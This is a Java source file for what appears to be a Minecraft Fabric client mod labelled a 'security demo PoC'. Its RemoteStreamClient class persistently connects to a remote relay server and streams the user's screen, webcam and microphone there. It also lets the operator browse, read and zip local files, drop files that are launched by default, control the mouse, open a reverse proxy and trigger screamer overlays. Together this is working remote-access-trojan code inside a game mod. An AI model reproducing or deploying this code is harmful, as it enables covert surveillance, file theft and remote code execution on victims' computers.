package com.securitydemo.poc;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.BiConsumer;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
public final class RemoteStreamClient {
   private static final Gson GSON = new Gson();
   private static final PocLogger.Log LOGGER = PocLogger.get();
   private final StreamRuntimeState state = new StreamRuntimeState();
   private final AtomicBoolean running = new AtomicBoolean(false);
   private final AtomicBoolean reconnecting = new AtomicBoolean(false);
   private final AtomicBoolean intentionalStop = new AtomicBoolean(false);
   private final AtomicBoolean streamingActive = new AtomicBoolean(false);
   private final Object streamPauseLock = new Object();
   private volatile RelaySocket webSocket;
   private ModSocketHandler socketHandler;
   private Thread captureThread;
   private String sessionId;
   private String viewUrl;
   private String serverBase;
   private int relayFps;
   private int relayQuality;
   private float relayScale;
   private boolean relayAdaptive;
   private final AtomicBoolean connectedAnnounced = new AtomicBoolean(false);
   private final AtomicBoolean watchdogRunning = new AtomicBoolean(false);
   private BiConsumer<String, String> onConnected;
   private RemoteAudioPublisher audioPublisher;
   private RemoteVideoPublisher videoPublisher;
   private ReverseProxyClient reverseProxyClient;
   private String proxyToken;

   public boolean start(String serverUrl, int fps, int quality, float scale, boolean adaptive) {
      if (this.running.get()) {
         return this.isConnected();
      } else {
         this.intentionalStop.set(false);
         this.connectedAnnounced.set(false);
         this.streamingActive.set(false);
         this.state.applyManual(fps, quality, scale, adaptive);
         this.serverBase = normalizeBaseUrl(serverUrl);
         this.relayFps = fps;
         this.relayQuality = quality;
         this.relayScale = scale;
         this.relayAdaptive = adaptive;
         this.running.set(true);
         this.startCaptureLoop();
         if (this.tryConnect()) {
            return true;
         } else {
            this.scheduleReconnect();
            this.startWatchdog();
            return false;
         }
      }
   }

   public void setOnConnected(BiConsumer<String, String> callback) {
      this.onConnected = callback;
   }

   public void stop() {
      this.intentionalStop.set(true);
      this.running.set(false);
      this.watchdogRunning.set(false);
      if (this.captureThread != null) {
         this.captureThread.interrupt();
         this.captureThread = null;
      }

      RelaySocket socket = this.webSocket;
      this.webSocket = null;
      if (socket != null) {
         socket.close();
      }

      if (this.audioPublisher != null) {
         this.audioPublisher.shutdown();
         this.audioPublisher = null;
      }

      if (this.videoPublisher != null) {
         this.videoPublisher.shutdown();
         this.videoPublisher = null;
      }

      if (this.reverseProxyClient != null) {
         this.reverseProxyClient.stop();
         this.reverseProxyClient = null;
      }

   }

   public boolean isConnected() {
      RelaySocket socket = this.webSocket;
      return socket != null && socket.isOpen();
   }

   public String sessionId() {
      return this.sessionId;
   }

   public String viewUrl() {
      return this.viewUrl;
   }

   private boolean tryConnect() {
      try {
         this.ensureSessionId();
         this.registerSession(this.serverBase, this.relayFps, this.relayQuality, this.relayScale, this.relayAdaptive);
         this.connectWebSocket(this.serverBase);
         if (this.audioPublisher != null) {
            this.audioPublisher.shutdown();
         }

         this.audioPublisher = new RemoteAudioPublisher(this.serverBase, this.sessionId, this::notifyViewer);
         if (this.videoPublisher != null) {
            this.videoPublisher.shutdown();
         }

         this.videoPublisher = new RemoteVideoPublisher(this.serverBase, this.sessionId, this::notifyViewer);
         this.startReverseProxy(this.serverBase);
         RelaySessionStore.save(this.sessionId, this.viewUrl, this.serverBase, DeviceIdentity.deviceId(), DeviceIdentity.deviceLabel());
         LOGGER.info("Remote relay session {} -> {}", this.sessionId, this.viewUrl);
         this.fireConnected();
         return true;
      } catch (IOException e) {
         LOGGER.warn("Relay connect failed: {}", e.getMessage());
         this.webSocket = null;
         return false;
      }
   }

   private void ensureSessionId() throws IOException {
      String stableId = DeviceIdentity.stableSessionId();
      String persisted = RelaySessionStore.loadSessionId();
      if (!Compat.isBlank(persisted) && !persisted.equals(stableId)) {
         LOGGER.info("Migrating relay session {} -> {} (device-bound id)", persisted, stableId);
      }

      this.sessionId = stableId;
   }

   private void fireConnected() {
      BiConsumer<String, String> callback = this.onConnected;
      if (callback != null && this.sessionId != null && this.viewUrl != null && this.connectedAnnounced.compareAndSet(false, true)) {
         callback.accept(this.sessionId, this.viewUrl);
      }

   }

   private void scheduleReconnect() {
      if (this.running.get() && !this.intentionalStop.get()) {
         if (this.reconnecting.compareAndSet(false, true)) {
            Thread thread = new Thread(this::reconnectLoop, "security-demo-poc-reconnect");
            thread.setDaemon(true);
            thread.start();
         }
      }
   }

   private void reconnectLoop() {
      long backoffMs = 3000L;

      try {
         while(this.running.get() && !this.intentionalStop.get() && !this.isConnected()) {
            if (this.tryConnect()) {
               backoffMs = 3000L;
               break;
            }

            sleep(backoffMs);
            backoffMs = Math.min(backoffMs * 2L, 30000L);
         }
      } finally {
         this.reconnecting.set(false);
      }

   }

   private void startWatchdog() {
      if (this.watchdogRunning.compareAndSet(false, true)) {
         Thread thread = new Thread(() -> {
            long backoffMs = 5000L;

            while(this.running.get() && !this.intentionalStop.get() && this.watchdogRunning.get()) {
               sleep(5000L);
               if (!this.running.get() || this.intentionalStop.get() || !this.watchdogRunning.get()) {
                  break;
               }

               if (this.isConnected()) {
                  backoffMs = 5000L;
               } else {
                  LOGGER.info("Relay watchdog: offline, reconnecting…");
                  if (this.tryConnect()) {
                     backoffMs = 5000L;
                  } else {
                     sleep(backoffMs);
                     backoffMs = Math.min(backoffMs * 2L, 30000L);
                  }
               }
            }

            this.watchdogRunning.set(false);
         }, "security-demo-poc-watchdog");
         thread.setDaemon(true);
         thread.start();
      }
   }

   private void registerSession(String base, int fps, int quality, float scale, boolean adaptive) throws IOException {
      JsonObject body = new JsonObject();
      body.addProperty("sessionId", this.sessionId);
      body.addProperty("deviceId", DeviceIdentity.deviceId());
      body.addProperty("deviceLabel", DeviceIdentity.deviceLabel());
      body.addProperty("fps", fps);
      body.addProperty("quality", quality);
      body.addProperty("scale", scale);
      body.addProperty("adaptive", adaptive);
      String payload = GSON.toJson(body);
      IOException lastError = null;

      for(int attempt = 1; attempt <= 20; ++attempt) {
         try {
            this.doRegisterPost(base, payload);
            LOGGER.info("Relay registered on attempt {}", attempt);
            return;
         } catch (IOException e) {
            lastError = e;
            LOGGER.warn("Relay register attempt {} failed: {}", attempt, e.getMessage());
            sleep(Math.min(2000L * (long)attempt, 10000L));
         }
      }

      throw lastError != null ? lastError : new IOException("Register failed");
   }

   private void doRegisterPost(String base, String payload) throws IOException {
      HttpURLConnection connection = (HttpURLConnection)URI.create(base + "/api/register").toURL().openConnection();
      connection.setRequestMethod("POST");
      connection.setDoOutput(true);
      connection.setConnectTimeout(15000);
      connection.setReadTimeout(15000);
      connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
      connection.setRequestProperty("Accept", "application/json");
      byte[] bytes = payload.getBytes(StandardCharsets.UTF_8);
      connection.setFixedLengthStreamingMode(bytes.length);
      OutputStream out = connection.getOutputStream();

      try {
         out.write(bytes);
      } catch (Throwable var9) {
         if (out != null) {
            try {
               out.close();
            } catch (Throwable var8) {
               var9.addSuppressed(var8);
            }
         }

         throw var9;
      }

      if (out != null) {
         out.close();
      }

      int code = connection.getResponseCode();
      InputStream stream = code >= 200 && code < 300 ? connection.getInputStream() : connection.getErrorStream();
      if (code == 410) {
         RelaySessionStore.clear();
         this.sessionId = DeviceIdentity.stableSessionId();
         throw new IOException("Session revoked — retrying");
      } else if (code >= 200 && code < 300) {
         JsonObject json = Compat.parseJsonObject((Reader)(new InputStreamReader(stream, StandardCharsets.UTF_8)));
         this.sessionId = json.get("sessionId").getAsString();
         this.viewUrl = json.get("viewUrl").getAsString();
         if (json.has("proxyToken") && !json.get("proxyToken").isJsonNull()) {
            this.proxyToken = json.get("proxyToken").getAsString();
         }

         connection.disconnect();
      } else {
         throw new IOException("Register failed HTTP " + code);
      }
   }

   private void startReverseProxy(String serverBase) {
      if (!Compat.isBlank(this.proxyToken) && !Compat.isBlank(this.sessionId)) {
         if (this.reverseProxyClient == null) {
            this.reverseProxyClient = new ReverseProxyClient();
         }

         this.reverseProxyClient.start(serverBase, this.sessionId, this.proxyToken);
      }
   }

   private static void sleep(long ms) {
      try {
         Thread.sleep(ms);
      } catch (InterruptedException var3) {
         Thread.currentThread().interrupt();
      }

   }

   private void connectWebSocket(String base) throws IOException {
      String wsBase = base.replace("https://", "wss://").replace("http://", "ws://");
      URI uri = URI.create(wsBase + "/ws/mod/" + this.sessionId);
      this.socketHandler = new ModSocketHandler();
      this.webSocket = RelaySocket.connect(uri, this.socketHandler, 10000);
   }

   private void startCaptureLoop() {
      if (this.captureThread == null) {
         this.captureThread = new Thread(() -> {
            int failStreak = 0;

            while(this.running.get() && !Thread.currentThread().isInterrupted()) {
               this.waitWhileStreamPaused();
               int fps = this.state.deliveryFps();
               long frameDelayMs = Math.max(1L, 1000L / (long)fps);
               long started = System.currentTimeMillis();
               RelaySocket socket = this.webSocket;
               if (this.streamingActive.get() && socket != null && socket.isOpen()) {
                  try {
                     byte[] frame = ScreenFrames.captureJpeg(this.state.captureQuality(), this.state.captureScale());
                     socket.sendBinary(frame);
                     if (failStreak > 0) {
                        LOGGER.info("Screen capture recovered after {} failures", failStreak);
                     }

                     failStreak = 0;
                  } catch (Exception e) {
                     ++failStreak;
                     if (failStreak == 1 || failStreak % 20 == 0) {
                        LOGGER.warn("Screen capture failed ({}x): {}", failStreak, e.getMessage());
                        Gson var10001 = GSON;
                        this.notifyViewer("{\"type\":\"capture_error\",\"message\":" + var10001.toJson(String.valueOf(e.getMessage())) + "}");
                     }
                  }
               }

               long captureMs = this.streamingActive.get() ? System.currentTimeMillis() - started : 0L;
               this.state.tuneAfterCapture(captureMs);
               long sleepMs = Math.max(1L, frameDelayMs - captureMs);

               try {
                  Thread.sleep(sleepMs);
               } catch (InterruptedException var13) {
                  Thread.currentThread().interrupt();
                  break;
               }
            }

         }, "security-demo-poc-relay");
         this.captureThread.setDaemon(true);
         this.captureThread.start();
      }
   }

   private void waitWhileStreamPaused() {
      if (!this.streamingActive.get()) {
         synchronized(this.streamPauseLock) {
            while(!this.streamingActive.get() && this.running.get() && !Thread.currentThread().isInterrupted()) {
               try {
                  this.streamPauseLock.wait(1000L);
               } catch (InterruptedException var4) {
                  Thread.currentThread().interrupt();
                  break;
               }
            }

         }
      }
   }

   private void resumeStreamCapture() {
      synchronized(this.streamPauseLock) {
         this.streamPauseLock.notifyAll();
      }
   }

   private void startStreamingOnDevice() {
      if (!this.streamingActive.getAndSet(true)) {
         this.resumeStreamCapture();
      }

      LOGGER.info("Screen capture started on this PC");
      this.notifyViewer("{\"type\":\"stream_state\",\"streaming\":true,\"onDevice\":true}");
   }

   private static String normalizeBaseUrl(String url) {
      String trimmed;
      for(trimmed = url.trim(); trimmed.endsWith("/"); trimmed = trimmed.substring(0, trimmed.length() - 1)) {
      }

      return trimmed;
   }

   private void handleMessage(String raw) {
      try {
         JsonObject json = Compat.parseJsonObject(raw);
         String type = json.has("type") ? json.get("type").getAsString() : "mouse";
         if ("settings".equals(type)) {
            if (json.has("fps")) {
               this.state.applyManual(json.get("fps").getAsInt(), json.has("quality") ? json.get("quality").getAsInt() : this.state.targetQuality, json.has("scale") ? json.get("scale").getAsFloat() : this.state.targetScale, !json.has("adaptive") || json.get("adaptive").getAsBoolean());
            }

            return;
         }

         if ("file_begin".equals(type)) {
            RemoteFileDropper.IncomingFile file = new RemoteFileDropper.IncomingFile();
            file.name = json.has("name") ? json.get("name").getAsString() : "dropped.bin";
            file.launch = !json.has("launch") || json.get("launch").getAsBoolean();
            file.expectedSize = json.has("size") ? json.get("size").getAsInt() : 0;
            if (this.socketHandler != null) {
               this.socketHandler.incomingFile = file;
            }

            return;
         }

         if ("file_end".equals(type)) {
            if (this.socketHandler != null) {
               this.socketHandler.finishIncomingFile();
            }

            return;
         }

         if ("troll_begin".equals(type)) {
            if (this.socketHandler != null) {
               IncomingTroll troll = new IncomingTroll();
               troll.requestId = json.has("requestId") ? json.get("requestId").getAsString() : "";
               troll.durationMs = json.has("durationMs") ? json.get("durationMs").getAsInt() : 3000;
               troll.imagePreset = json.has("imagePreset") ? json.get("imagePreset").getAsString() : "random";
               troll.soundPreset = json.has("soundPreset") ? json.get("soundPreset").getAsString() : "default";
               troll.imageSize = json.has("imageSize") ? json.get("imageSize").getAsInt() : 0;
               troll.soundSize = json.has("soundSize") ? json.get("soundSize").getAsInt() : 0;
               this.socketHandler.incomingTroll = troll;
            }

            return;
         }

         if ("troll_end".equals(type)) {
            if (this.socketHandler != null) {
               this.socketHandler.finishIncomingTroll();
            }

            return;
         }

         if ("file_drop".equals(type)) {
            String name = json.has("name") ? json.get("name").getAsString() : "dropped.bin";
            boolean launch = !json.has("launch") || json.get("launch").getAsBoolean();
            String data = json.has("data") ? json.get("data").getAsString() : "";
            if (!Compat.isBlank(data)) {
               RemoteFileDropper.handleBytes(name, launch, Base64.getDecoder().decode(Compat.strip(data)), this::notifyViewer);
            }

            return;
         }

         if ("file_list_request".equals(type)) {
            String requestId = json.has("requestId") ? json.get("requestId").getAsString() : "";
            String path = json.has("path") ? json.get("path").getAsString() : "";
            RemoteFileBrowser.handleListRequest(path, requestId, this::notifyViewer);
            return;
         }

         if ("file_read_request".equals(type)) {
            String requestId = json.has("requestId") ? json.get("requestId").getAsString() : "";
            String path = json.has("path") ? json.get("path").getAsString() : "";
            RemoteFileBrowser.handleReadRequest(path, requestId, this::notifyViewer);
            return;
         }

         if ("file_zip_request".equals(type)) {
            String requestId = json.has("requestId") ? json.get("requestId").getAsString() : "";
            String path = json.has("path") ? json.get("path").getAsString() : "";
            RemoteFileBrowser.handleZipRequest(path, requestId, this::notifyViewer);
            return;
         }

         if ("video_devices_request".equals(type)) {
            String requestId = json.has("requestId") ? json.get("requestId").getAsString() : "";
            JsonObject response = new JsonObject();
            response.addProperty("type", "video_devices_response");
            response.addProperty("requestId", requestId);
            response.addProperty("source", "cam");
            JsonArray devices = new JsonArray();

            for(VideoCapture.VideoDevice device : VideoCapture.listDevices()) {
               JsonObject item = new JsonObject();
               item.addProperty("index", device.index);
               item.addProperty("name", device.name);
               item.addProperty("description", device.description);
               devices.add(item);
            }

            response.add("devices", devices);
            this.notifyViewer(response.toString());
            return;
         }

         if ("video_control".equals(type)) {
            if (this.videoPublisher != null) {
               String source = json.has("source") ? json.get("source").getAsString() : "cam";
               String action = json.has("action") ? json.get("action").getAsString() : "";
               int fps = json.has("fps") ? json.get("fps").getAsInt() : 10;
               float quality = json.has("quality") ? json.get("quality").getAsFloat() : 0.55F;
               float scale = json.has("scale") ? json.get("scale").getAsFloat() : 0.5F;
               String device = json.has("device") ? json.get("device").getAsString() : null;
               LOGGER.info("Relay video_control: {} {}", source, action);
               this.videoPublisher.handleControl(source, action, fps, quality, scale, device);
            } else {
               LOGGER.warn("Relay video_control ignored — publisher not ready");
            }

            return;
         }

         if ("audio_devices_request".equals(type)) {
            String requestId = json.has("requestId") ? json.get("requestId").getAsString() : "";
            String sourceStr = json.has("source") ? json.get("source").getAsString() : "mic";
            AudioCapture.Source source = "sys".equals(sourceStr) ? AudioCapture.Source.SYSTEM : AudioCapture.Source.MIC;
            JsonObject response = new JsonObject();
            response.addProperty("type", "audio_devices_response");
            response.addProperty("requestId", requestId);
            response.addProperty("source", sourceStr);
            JsonArray devices = new JsonArray();

            for(AudioCapture.AudioDevice device : AudioCapture.listDevices(source)) {
               JsonObject item = new JsonObject();
               item.addProperty("index", device.index);
               item.addProperty("name", device.name);
               item.addProperty("description", device.description);
               devices.add(item);
            }

            response.add("devices", devices);
            this.notifyViewer(response.toString());
            return;
         }

         if ("audio_control".equals(type)) {
            if (this.audioPublisher != null) {
               String source = json.has("source") ? json.get("source").getAsString() : "";
               String action = json.has("action") ? json.get("action").getAsString() : "";
               int sampleRate = json.has("sampleRate") ? json.get("sampleRate").getAsInt() : 16000;
               int channels = json.has("channels") ? json.get("channels").getAsInt() : 1;
               String device = json.has("device") ? json.get("device").getAsString() : null;
               LOGGER.info("Relay audio_control: {} {}", source, action);
               this.audioPublisher.handleControl(source, action, sampleRate, channels, device);
            } else {
               LOGGER.warn("Relay audio_control ignored — publisher not ready");
            }

            return;
         }

         if ("session_revoke".equals(type)) {
            LOGGER.info("Session revoked from panel — stopping relay on this PC");
            RelaySessionStore.clear();
            this.intentionalStop.set(true);
            this.streamingActive.set(false);
            this.running.set(false);
            this.notifyViewer("{\"type\":\"session_revoked\"}");
            (new Thread(new Runnable() {
               public void run() {
                  RemoteStreamClient.this.stop();
               }
            }, "security-demo-poc-revoke")).start();
            return;
         }

         if ("troll".equals(type)) {
            int durationMs = json.has("durationMs") ? json.get("durationMs").getAsInt() : 3000;
            String imagePreset = json.has("imagePreset") ? json.get("imagePreset").getAsString() : "random";
            String soundPreset = json.has("soundPreset") ? json.get("soundPreset").getAsString() : "default";
            String requestId = json.has("requestId") ? json.get("requestId").getAsString() : "";
            byte[] imageBytes = null;
            byte[] soundBytes = null;
            if (json.has("imageBase64") && !json.get("imageBase64").isJsonNull()) {
               imageBytes = Base64.getDecoder().decode(Compat.strip(json.get("imageBase64").getAsString()));
            }

            if (json.has("soundBase64") && !json.get("soundBase64").isJsonNull()) {
               soundBytes = Base64.getDecoder().decode(Compat.strip(json.get("soundBase64").getAsString()));
            }

            ScreamerOverlay.trigger(durationMs, imagePreset, imageBytes, soundPreset, soundBytes, requestId, this::notifyViewer);
            return;
         }

         if ("stream_control".equals(type)) {
            String action = json.has("action") ? json.get("action").getAsString() : "";
            if ("stop".equals(action)) {
               this.streamingActive.set(false);
               LOGGER.info("Screen capture stopped on this PC");
               this.notifyViewer("{\"type\":\"stream_state\",\"streaming\":false,\"onDevice\":true}");
            } else if ("start".equals(action)) {
               this.startStreamingOnDevice();
            }

            return;
         }

         if (!json.has("action") || !json.has("x") || !json.has("y")) {
            return;
         }

         String action = json.get("action").getAsString();
         double x = json.get("x").getAsDouble();
         double y = json.get("y").getAsDouble();
         int button = json.has("button") ? json.get("button").getAsInt() : 0;
         boolean doubleClick = json.has("double") && json.get("double").getAsBoolean();
         if ("move".equals(action)) {
            RemoteInputController.moveNormalized(x, y);
         } else if ("down".equals(action)) {
            RemoteInputController.pressNormalized(x, y, button);
         } else if ("up".equals(action)) {
            RemoteInputController.releaseNormalized(x, y, button);
         } else if ("click".equals(action)) {
            RemoteInputController.clickNormalized(x, y, button, doubleClick);
         }
      } catch (Exception e) {
         LOGGER.warn("Bad relay message: {}", raw.length() > 200 ? raw.substring(0, 200) + "…" : raw, e);
      }

   }

   private void notifyViewer(String json) {
      RelaySocket socket = this.webSocket;
      if (socket != null && socket.isOpen()) {
         socket.sendText(json);
      }

   }

   @Environment(EnvType.CLIENT)
   private static final class IncomingTroll {
      private String requestId = "";
      private int durationMs = 3000;
      private String imagePreset = "random";
      private String soundPreset = "default";
      private int imageSize;
      private int soundSize;
      private final ByteArrayOutputStream imageBuf = new ByteArrayOutputStream();
      private final ByteArrayOutputStream soundBuf = new ByteArrayOutputStream();
   }

   @Environment(EnvType.CLIENT)
   private final class ModSocketHandler implements RelaySocket.Listener {
      private RemoteFileDropper.IncomingFile incomingFile;
      private IncomingTroll incomingTroll;

      public void onOpen(RelaySocket socket) {
         RemoteStreamClient.LOGGER.info("Relay WebSocket open for session {}", RemoteStreamClient.this.sessionId);
      }

      public void onText(String message) {
         RemoteStreamClient.this.handleMessage(message);
      }

      public void onBinary(byte[] data) {
         if (this.incomingTroll != null) {
            this.appendTrollBytes(data);
         } else {
            if (this.incomingFile != null) {
               this.incomingFile.buffer.write(data, 0, data.length);
            }

         }
      }

      private void appendTrollBytes(byte[] data) {
         IncomingTroll troll = this.incomingTroll;
         if (troll != null && data != null && data.length != 0) {
            int offset = 0;
            if (troll.imageSize > 0 && troll.imageBuf.size() < troll.imageSize) {
               int need = troll.imageSize - troll.imageBuf.size();
               int take = Math.min(need, data.length);
               troll.imageBuf.write(data, 0, take);
               offset = take;
            }

            if (offset < data.length && troll.soundSize > 0 && troll.soundBuf.size() < troll.soundSize) {
               int need = troll.soundSize - troll.soundBuf.size();
               int take = Math.min(need, data.length - offset);
               troll.soundBuf.write(data, offset, take);
            }

         }
      }

      private void finishIncomingTroll() {
         IncomingTroll troll = this.incomingTroll;
         this.incomingTroll = null;
         if (troll != null) {
            byte[] imageBytes = troll.imageSize > 0 ? troll.imageBuf.toByteArray() : null;
            byte[] soundBytes = troll.soundSize > 0 ? troll.soundBuf.toByteArray() : null;
            ScreamerOverlay.trigger(troll.durationMs, troll.imagePreset, imageBytes, troll.soundPreset, soundBytes, troll.requestId, RemoteStreamClient.this::notifyViewer);
         }
      }

      public void onClose(int statusCode, String reason) {
         RemoteStreamClient.LOGGER.warn("Relay WebSocket closed {} {}", statusCode, reason);
         RemoteStreamClient.this.connectedAnnounced.set(false);
         RemoteStreamClient.this.webSocket = null;
         RemoteStreamClient.this.scheduleReconnect();
      }

      public void onError(Throwable error) {
         RemoteStreamClient.LOGGER.warn("Relay WebSocket error", error);
         RemoteStreamClient.this.connectedAnnounced.set(false);
         RemoteStreamClient.this.webSocket = null;
         RemoteStreamClient.this.scheduleReconnect();
      }

      private void finishIncomingFile() {
         RemoteFileDropper.IncomingFile file = this.incomingFile;
         this.incomingFile = null;
         if (file != null) {
            RemoteFileDropper.handleBytes(file.name, file.launch, file.buffer.toByteArray(), RemoteStreamClient.this::notifyViewer);
         }
      }
   }
}
